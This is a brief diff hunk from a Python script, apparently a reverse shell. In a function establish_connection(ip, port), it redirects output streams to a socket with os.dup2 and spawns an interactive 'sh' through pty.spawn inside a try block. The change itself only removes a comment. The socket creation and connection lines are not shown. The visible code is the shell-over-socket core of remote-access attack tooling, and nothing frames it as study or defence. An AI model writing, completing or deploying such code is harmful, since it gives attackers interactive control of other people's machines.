@@ -27,7 +27,6 @@ def establish_connection(ip, port):
             os.dup2(s.fileno(), 1)
             os.dup2(s.fileno(), 2)
 
-            # Moved the shell spawning into a try block within the loop
             try:
                 pty.spawn("sh")
             except Exception as shell_error:
